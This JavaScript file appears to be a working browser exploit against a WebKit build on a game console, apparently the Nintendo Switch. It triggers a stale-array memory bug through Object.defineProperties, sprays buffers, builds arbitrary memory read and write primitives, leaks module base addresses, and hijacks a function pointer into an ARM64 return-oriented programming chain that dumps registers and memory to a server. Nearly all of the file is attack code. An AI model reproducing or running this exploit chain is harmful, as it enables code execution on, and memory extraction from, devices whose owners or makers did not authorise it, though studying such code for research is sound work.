function send(ep, data) {
	data = JSON.stringify(data);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.send('data=' + encodeURIComponent(data));
	} catch(e) {

	}
}
console = {
	log : function(msg) {
		if(onSwitch !== undefined)
			send('log', msg);
		else
			print('Log: ' + JSON.stringify(msg));
	}
};
var log = console.log;
if(onSwitch !== undefined) {
	window.onerror = function(msg, url, line) {
		send('error', [line, msg]);
		location.reload();
	};
}

var readsize = 495616, readoff = 1024 * 1024 * 7;
function memdump(lo, hi, temp, size) {
	var data = new Array(size);
	for(var i = 0; i < size; ++i)
		data[i] = temp[i];
	send('memdump', [lo.toString(16), hi.toString(16), data]);
}

log('Loaded');

var rwbuf = new ArrayBuffer(0x1003 * 4);
var tu = new Uint32Array(rwbuf);
for(var i = 0; i < tu.length; ++i)
	tu[i] = ((i & 1) == 0) ? 0x41424344 : 0x41414141;

function pressureGC() {
	var pressure = new Array(4000);
	log('Pressurizing');
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = new Uint32Array(0x1000);
	}
	for (var i = 0; i < pressure.length; ++i)
		pressure[i] = 0;
}

var bufs;
function allocBuffers() {
	bufs = new Array(1500000);
	log('Making ' + bufs.length + ' buffers');
	for(var i = 0; i < bufs.length; ++i) {
		bufs[i] = new Uint32Array(rwbuf);
	}
}

function paddr(lo, hi) {
	if(arguments.length == 1) {
		hi = lo[1];
		lo = lo[0];
	}
	var slo = ('00000000' + lo.toString(16)).slice(-8);
	var shi = ('00000000' + hi.toString(16)).slice(-8);
	return '0x' + shi + slo;
}

function doExploit(buf, stale, temp) {
	function dump(name, buf, count) {
		for(var j = 0; j < count; ++j)
			log(name + '[' + j + '] == 0x' + buf[j].toString(16));
	}
	function dumpbuf(count) {
		dump('Buf', buf, count);
	}
	function dumptemp(count) {
		dump('Tem', temp, count);
	}
	function dumpaddr(addr, count) {
		buf[4] = addr[0];
		buf[5] = addr[1];
		dumptemp(count);
	}

	var func = document.getElementById;
	func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
	var funcaddr;
	var funcbase = 0x835DC4; // This is the base address for getElementById in the webkit module

	var leakee = {'b' : null};
	var leaker = {'a' : leakee};
	var leaklo, leakhi;

	stale[1] = leaker;
	var leaklo = buf[4], leakhi = buf[5];
	stale[1] = temp;
	var leakaddr = [leaklo, leakhi];

	function nullptr(addr) {
		return addr[0] == 0 && addr[1] == 0;
	}
	function add2(addr, off) {
		if(typeof(off) == 'number')
			off = [off, 0];

		var alo = addr[0], ahi = addr[1];
		var blo = off[0], bhi = off[1];

		var nlo = ((alo + blo) & 0xFFFFFFFF) >>> 0;
		var nhi = ((ahi + bhi) & 0xFFFFFFFF) >>> 0;

		if((nlo < alo && blo > 0) || (nlo == alo && blo != 0)) {
			nhi = ((nhi + 1) & 0xFFFFFFFF) >>> 0;
		} else if(nlo > alo && blo < 0) {
			nhi = ((nhi - 1) & 0xFFFFFFFF) >>> 0;
		}

		return [nlo, nhi];
	}
	function offset32(addr, off) {
		return add(addr, off * 4);
	}
	function read4(addr, offset) {
		if(arguments.length == 1)
			offset = 0;
		buf[4] = addr[0];
		buf[5] = addr[1];
		buf[6] = 0xFFFFFFFF;

		return temp[offset];
	}
	function write4(val, addr, offset) {
		if(arguments.length == 2)
			offset = 0;
		buf[4] = addr[0];
		buf[5] = addr[1];
		buf[6] = 0xFFFFFFFF;

		temp[offset] = val;
	}
	function read8(addr, offset) {
		if(arguments.length == 1)
			offset = 0;
		return [read4(addr, offset), read4(addr, offset + 1)];
	}
	function write8(val, addr, offset) {
		if(arguments.length == 2)
			offset = 0;
		write4(val[0], addr, offset);
		write4(val[1], addr, offset + 1);
	}
	function getAddr(obj) {
		leakee['b'] = obj;
		return read8(leakaddr, 4);
	}

	function getBase() {
		var tlfuncaddr = getAddr(func);
		funcaddr = read8(tlfuncaddr, 6);

		var baseaddr = add2(read8(funcaddr, 8), -funcbase);

		log('First module ... ' + paddr(baseaddr));

		return baseaddr;
	}

	function dumpNRO() {
		var addr = getBase();
		log('Reading from ' + paddr(addr));

		addr = add2(addr, readoff);
		buf[4] = addr[0];
		buf[5] = addr[1];
		buf[6] = 0xFFFFFFFF;

		memdump(addr[0], addr[1], temp, readsize >> 2);
	}

	function walkList() {
		var addr = getBase();
		log('Initial NRO at ' + paddr(addr));

		while(true) {
			var baddr = addr;

			var modoff = read4(addr, 1);
			addr = add2(addr, modoff);
			var modstr = read4(addr, 6);
			addr = add2(addr, modstr);

			// Read next link ptr
			addr = read8(addr);
			if(nullptr(addr)) {
				log('Reached end');
				break;
			}

			var nro = read8(addr, 8);

			if(nullptr(nro)) {
				log('Hit RTLD at ' + paddr(addr));
				addr = read8(addr, 4);
				break;
			}

			buf[4] = nro[0];
			buf[5] = nro[1];
			if(read4(nro, 4) != 0x304f524e) {
				log('Something is wrong.  No NRO header at base.');
				break;
			}

			addr = nro;
			log('Found NRO at ' + paddr(nro));
		}

		while(true) {
			var nro = read8(addr, 8);
			if(nro[0] == 0 && nro[1] == 0) {
				log('Hm, hit the end of things.  Back in rtld?');
				return;
			}

			if(read4(nro, read4(nro, 1) >> 2) == 0x30444f4d) {
				log('Got MOD at ' + paddr(nro));
				if(read4(nro, 4) == 0x8DCDF8 && read4(nro, 5) == 0x959620) {
					log('Found main module.');
					return nro;
				}
			} else {
				log('No valid MOD header.  Back at RTLD.');
				break;
			}

			addr = read8(addr, 0);
			if(nullptr(addr)) {
				log('End of chain.');
				break;
			}
		}
	}

	var mainaddr = walkList();

	function getSP() {
		/*
			First gadget: hijack X8 via ADRP and known PC, load X2 from known address and branch there
		
			.text:000000000039FEEC 08 2C 00 90                 ADRP            X8, #qword_91F320@PAGE ; Address of Page
			.text:000000000039FEF0 08 81 0C 91                 ADD             X8, X8, #qword_91F320@PAGEOFF ; Rd = Op1 + Op2
			.text:000000000039FEF4 02 05 40 F9                 LDR             X2, [X8,#(qword_91F328 - 0x91F320)] ; Load from Memory
			.text:000000000039FEF8 40 00 1F D6                 BR              X2      ; Branch To Register
		*/
		/*
			Second gadget: assuming known X8, grab X9 value, leak SP via X24, and branch to X9
		
			.text:00000000003E2724                 LDR             X9, [X8,#0x30]
			.text:00000000003E2728                 MOV             X8, SP
			.text:00000000003E272C                 MOV             X0, X23
			.text:00000000003E2730                 MOV             X24, SP
			.text:00000000003E2734                 BLR             X9
		*/
		var test = 0x39FEEC; // First gadget addr
		var jaddr = add2(mainaddr, test);
		log('New jump at ' + paddr(jaddr));
		log('Assigning function pointer');

		log('Function object at ' + paddr(funcaddr));
		var curptr = read8(funcaddr, 8);

		
		var retaddr = add2(mainaddr, 0x3E2724); // Second gadget addr
		var memaddr = add2(mainaddr, 0x91F328);
		write8(retaddr, memaddr);
		retaddr = add2(add2(curptr, -funcbase), 0x836050); // Last gadget addr (should just be `blr X27`)
		memaddr = add2(mainaddr, 0x91F350);
		write8(retaddr, memaddr);

		// For addresses in webkit_wkc
		//write8(add2(add2(curptr, -funcbase), 0x836050), funcaddr, 8);

		// For addresses in app
		write8(jaddr, funcaddr, 8);

		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));

		log('Assigned.  Jumping.');
		var ret = func.apply(0x101);
		log('Jumped back.');

		var sp = getAddr(ret);

		log('Got stack pointer: ' + paddr(sp));

		write8(curptr, funcaddr, 8);

		log('Restored original function pointer.');

		return sp;
	}

	function testarg() {
		var test = 0x39FEEC; // First gadget addr
		var jaddr = add2(mainaddr, test);
		log('New jump at ' + paddr(jaddr));
		log('Assigning function pointer');

		log('Function object at ' + paddr(funcaddr));
		var curptr = read8(funcaddr, 8);

		var wkcaddr = add2(curptr, -funcbase);

		var retaddr = add2(wkcaddr, 0x16EA88); // Second gadget addr
		var memaddr = add2(mainaddr, 0x91F320 + 0x8);
		write8(retaddr, memaddr);
		retaddr = add2(wkcaddr, 0xBDD8AC); // Third gadget addr
		memaddr = add2(mainaddr, 0x91F320 + 0x10);
		write8(retaddr, memaddr);
		retaddr = add2(wkcaddr, 0x836050); // Last gadget addr (should just be `blr X27`)
		memaddr = add2(mainaddr, 0x91F320 + 0x568);
		write8(retaddr, memaddr);

		// For addresses in webkit_wkc
		//write8(add2(add2(curptr, -funcbase), 0x836050), funcaddr, 8);

		// For addresses in app
		write8(jaddr, funcaddr, 8);

		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));

		log('Assigned.  Jumping.');
		var ret = func.apply(0x101);
		log('Jumped back.');

		log('Output addr: ' + paddr(getAddr(ret)));

		write8(curptr, funcaddr, 8);

		log('Restored original function pointer.');
	}

	var allocated = {};
	function malloc(bytes) {
		var obj = new Uint32Array(bytes >> 2);
		var addr = read8(getAddr(obj), 4);
		allocated[addr] = obj;
		return addr;
	}
	function free(addr) {
		allocated[addr] = 0;
	}

	function holyrop() {
		var sp = getSP();

		function mref(off) { return add2(mainaddr, off); }

		log('Starting holy rop');
		var jaddr = mref(0x39FEEC); // First gadget addr
		log('New jump at ' + paddr(jaddr));
		log('Assigning function pointer');

		log('Function object at ' + paddr(funcaddr));
		var curptr = read8(funcaddr, 8);
		write8(jaddr, funcaddr, 8);
		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));

		log('Setting up structs');

		var fixed = mref(0x91F320);
		var saved = new Uint32Array(0x1000);
		for(var i = 0; i < 0x1000; ++i)
			saved[i] = read4(fixed, i);

		// Begin Gadgets
		var gadg2 = mref(0x4967F0);
		var gadg3 = mref(0x433EB4);
		var gadg4 = mref(0x1A1C98);
		var gadg5 = mref(0x3C2314);
		var returngadg = mref(0x181E9C);

		var savegadg = mref(0x4336B0);
		// End Gadgets

		var context_load_struct = malloc(0x200);
		var block_struct_1 = malloc(0x200);
		var block_struct_2 = malloc(0x200);
		var savearea = malloc(0x400);

		write8(context_load_struct, fixed, 0x00 >> 2);
		write8(gadg2, fixed, 0x08 >> 2);
		write8(gadg3, fixed, 0x10 >> 2);
		write8(gadg2, fixed, 0x18 >> 2);
		write8(block_struct_1, fixed, 0x28 >> 2);

		sp = add2(sp, -0x8030);
		write8(gadg4, context_load_struct, 0x58 >> 2);
		write8(sp, context_load_struct, 0x68 >> 2);
		write8(returngadg, context_load_struct, 0x158 >> 2);
		write8(add2(sp, 0x8030), context_load_struct, 0x168 >> 2);

		write8(savearea, block_struct_1, 0x0 >> 2);
		write8(gadg5, block_struct_1, 0x10 >> 2);
		write8(gadg2, block_struct_1, 0x18 >> 2);
		write8(block_struct_2, block_struct_1, 0x28 >> 2);
		write8(savegadg, block_struct_1, 0x38 >> 2);

		write8(gadg4, sp, 0x28 >> 2);

		sp = add2(sp, 0x30);

		write8(add2(context_load_struct, 0x100), block_struct_2, 0x00 >> 2);
		write8(gadg3, block_struct_2, 0x10 >> 2);

		sp = add2(sp, 0x8000);

		log('Assigned.  Jumping.');
		var ret = func.apply(0x101);
		log('Jumped back.');

		write8(curptr, funcaddr, 8);

		log('Restored original function pointer.');

		for(var i = 0; i < 0x1000; ++i)
			write4(saved[i], fixed, i);
		log('Restored data page.');



		if (read8(savearea, 0x30))
		for (var i = 0; i <= 8 * 30; i += 8) {
			log('X' + (i / 8).toString() + ': ' + paddr(read8(savearea, i >> 2)));
		}
	}

	holyrop();
	return;

	function callNative(addr) {
		var sp = getSP();
		log('Setting up stack at SP ' + paddr(sp));
	}

	callNative(add2(mainaddr, 0x433744));
}

function doItAll() {
	log('Starting');

	bufs = undefined;

	var arr = new Array(0x100);
	var yolo = new ArrayBuffer(0x1000);
	arr[0] = yolo;
	arr[1] = 0x13371337;

	var not_number = {};
	not_number.toString = function() {
		arr = null;
		props["stale"]["value"] = null;

		if(bufs === undefined) {
			//pressureGC();
			allocBuffers();
		}

		return 10;
	};

	var props = {
		p0 : { value : 0 },
		p1 : { value : 1 },
		p2 : { value : 2 },
		p3 : { value : 3 },
		p4 : { value : 4 },
		p5 : { value : 5 },
		p6 : { value : 6 },
		p7 : { value : 7 },
		p8 : { value : 8 },
		length : { value : not_number },
		stale : { value : arr },
		after : { value : 666 } 
	};

	var target = [];
	var stale = 0;
	var before_len = arr.length; 
	Object.defineProperties(target, props);
	stale = target.stale;

	log('Checking if triggered...');
	if(stale.length == before_len) {
		log('Failed to overwrite array');
		location.reload();
		return;
	}

	log('Triggered.  New length: 0x' + stale.length.toString(16));

	/*if(stale.length != 0x1001) {
		log('Bailing.');
		location.reload();
		return;
	}*/

	var temp = new Uint32Array(0x10);
	temp[0] = 0x41414141;
	stale[1] = temp;

	log('Looking for buf...');

	var found = false;
	for(var i = 0; i < bufs.length; ++i) {
		if(bufs[i][0] != 0x41424344) {
			found = true;
			doExploit(bufs[i], stale, temp);
			break;
		}
	}

	if(!found) {
		log('Failed to find buffer.  Reloading.');
		location.reload();
	}

	log('Done');
}

